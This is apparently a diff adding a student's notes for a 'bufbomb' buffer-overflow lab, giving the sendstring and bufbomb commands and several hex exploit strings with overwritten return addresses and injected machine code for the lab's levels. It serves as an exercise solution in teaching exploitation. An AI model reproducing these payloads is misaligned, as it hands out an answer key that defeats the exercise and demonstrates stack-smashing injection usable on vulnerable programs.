@@ -1,0 +1,11 @@
+./sendstring < exploit.txt > exploit-raw.txt
+./bufbomb -t SA16225369 < exploit-raw.txt
+
+start -t SA16225369 < exploit-raw.txt 
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 8d 04 08 00 00 00 00 d1 fa 6a 2e
+a1 cc a1 04 08 a3 dc a1 04 08 68 60 8d 04 08 c3 7c bf ff bf
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 bf ff bf a1 cc a1 04 08 a3 dc a1 04 08 68 60 8d 04 08 c3
+c7 05 dc a1 04 08 d1 fa 6a 2e c3 00 00 00 00 00 7c bf ff bf 60 8d 04 08
+a1 cc a1 04 08 a3 dc a1 04 08 c3 00 a8 bf ff bf 7c bf ff bf 60 8d 04 08 1e 90 04 08
